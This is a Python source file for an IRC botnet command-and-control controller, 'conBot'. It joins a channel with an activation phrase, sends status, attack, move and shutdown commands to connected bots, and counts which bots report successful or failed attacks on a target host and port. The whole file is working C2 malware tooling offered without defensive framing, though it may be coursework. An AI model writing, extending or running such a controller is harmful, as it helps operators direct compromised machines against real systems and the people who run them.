import socket
import time
import random
import string
import sys
import threading
import select
import signal


class conBot(threading.Thread):
    def __init__(self, nick, host, port, chan, phrase):
        self.chan = chan 
        self.host = host
        self.port = port
        self.NICK = nick
        self.activationPhrase = phrase
        self.command = ["initial Command"]        
        self.comList = ["status","attack","move","quit","shutdown"]
        self.responses = ["!ATTACK!","!STATUS!","!MOVE!","!SHUTDOWN!"]
        self.botList = []
        self.attackBotListSucc = []
        self.attackBotListFail = []
        self.moveBotList = []
        self.disconnectedBotList = []
        self.isConnected = False
        self.inputReceived = False
        threading.Thread.__init__ ( self ) 
        
        self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
        
        try:
            self.s.connect((self.host, self.port)) 
        
        except Exception as e:           
            self.s.connect((self.host,self.port))
                        
        self.controller = ""
        self.gameOn = False        
        self.connectIRC(self.s,self.NICK,self.chan)        
        self.comList.append(self.activationPhrase)
        self.recThread = threading.Thread(target = self.connection)
        self.recThread.daemon = True
        self.recThread.start()
        time.sleep(7)
        
        self.inputLoop()
        
    def stop(self):
        self.__stop = True
        
    def parsemsg(self,s):
        """Breaks a message from an IRC server into its prefix, command, and arguments.
        """
        prefix = ''
        trailing = []        
        if not s:
            raise IRCBadMessage("Empty line.")
        if s[0] == ':':            
            prefix, s = s[1:].split(' ', 1)
        if s.find(' :') != -1:
            s, trailing = s.split(' :', 1)
            args = s.split()
            args.append(trailing)
        else:
            args = s.split()
        command = args.pop(0)
        return prefix, command, args
    
    def createNick(self, nick):
        self.NICK = nick + ''.join(random.choice(string.ascii_lowercase) for i in range(5))      
        
        
    def connectIRC(self, s, nick, CHAN):         
        s.send("USER {} {} {} {}:Test\n".format(nick,nick,nick,nick).encode("utf-8"))
        s.send("NICK {}\r\n".format(nick).encode("utf-8"))
        s.send("JOIN {}\r\n".format(CHAN).encode("utf-8"))
        self.NICK = nick
    
        
    def inputLoop(self):      
        while True:            
            userCommand = input("Please enter a valid command:")
            self.command = userCommand.split()
            if(self.command[0] == self.activationPhrase):
                    self.isConnected = True
                    self.s.send("PRIVMSG {} : {}\r\n".format(self.chan, self.command[0]).encode("utf-8"))
            elif(self.command[0] == "status") :  
                self.botList = []                  
                self.s.send("PRIVMSG {} : {}\r\n".format(self.chan, "!"+self.command[0]).encode("utf-8"))
            elif(self.command[0] == "attack") :  
                self.attackBotListSucc = []
                self.attackBotListFail = []                  
                self.s.send("PRIVMSG {} : {} {} {}\r\n".format(self.chan, "!"+self.command[0],self.command[1],self.command[2]).encode("utf-8"))
            elif(self.command[0] == "move"):
                self.moveBotList = []
                self.s.send("PRIVMSG {} : {} {} {} {}\r\n".format(self.chan,"!"+self.command[0],self.command[1],self.command[2],self.command[3]).encode("utf-8"))
            elif(self.command[0] == "shutdown"):
                self.disconnectedBotList = []
                self.s.send("PRIVMSG {} : {}\r\n".format(self.chan,"!"+self.command[0]).encode("utf-8"))
            elif(self.command[0] == "quit"):                 
                 sys.exit()
            time.sleep(5)
            self.parseResponses()
            
    def parseResponses(self):
        if(self.command[0] == "status"):
            lock = threading.Lock()
            with lock:
                print("Found {} bots: {}".format(str(len(self.botList)),','.join(self.botList)))        
        elif self.command[0] == "attack":
            for i in self.attackBotListSucc:
                print("{}: attack successful".format(i))
            for i in self.attackBotListFail:
                print("{}: attack failed".format(i))
            print("Total: {} successful, {} unsuccessful".format(str(len(self.attackBotListSucc)),str(len(self.attackBotListFail))))
        elif self.command[0] == "move":
            print("{} bots were moved".format(str(len(self.moveBotList))))
        elif self.command[0] == "shutdown":
            for i in self.disconnectedBotList:
                print("{}: was disconnected".format(i))
        
            
    def handleResponse(self, prefix,test):
        name = prefix.split("!~")
        if(test[0] == "!STATUS!"):
            if(name not in self.botList):
                self.botList.append(name[0])                
        elif(test[0] == "!ATTACK!"):            
            message = ' '.join(test[1:])            
            if(message == "attack was successful"):
                self.attackBotListSucc.append(name[0])
            elif(message == "attack was unsuccessful"):
                self.attackBotListFail.append(name[0])            
        elif(test[0] == "!MOVE!"):            
            message = ' '.join(test[1:])           
            if("pz out" in message):
                self.moveBotList.append(name[0])
        elif(test[0] == "!SHUTDOWN!"):            
            message = ' '.join(test[1:])
            if(message == "shutdown i'm out"):
                self.disconnectedBotList.append(name[0])
            
    def connection(self):       
        print("Connecting to IRC...")                  
        try:
            while True:
                responses = self.s.recv(4096).decode("utf-8").split("\r\n")
                for response in responses:
                    if(response != ""):   
                        (prefix, command, args) = self.parsemsg(response)                                       
                        if command == "PRIVMSG":                            
                            test = args[1].split()
                            #print("prefix: " + prefix)
                            if(test[0] in self.responses):                                
                                self.handleResponse(prefix,test)                                    
                        elif command == "PING":
                            self.s.send("PONG {}: :\r\n".format(prefix).encode("utf-8"))                                                                          
                        elif command == '433':
                            self.createNick(self.NICK)
                            self.connectIRC(self.s,self.NICK, self.chan)        
        except Exception as e:
            print("Exception: ")
            print(e)
            print("Reconnecting in 5 seconds ...")
            time.sleep(5)
            self.connection()
    
def main():        
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    CHAN = "#" + sys.argv[3]
    PHRASE = sys.argv[4]
    
    cBot = conBot("conbot",HOST,PORT,CHAN,PHRASE)
    cBot.start()             

if __name__ == '__main__':
    main()
                    
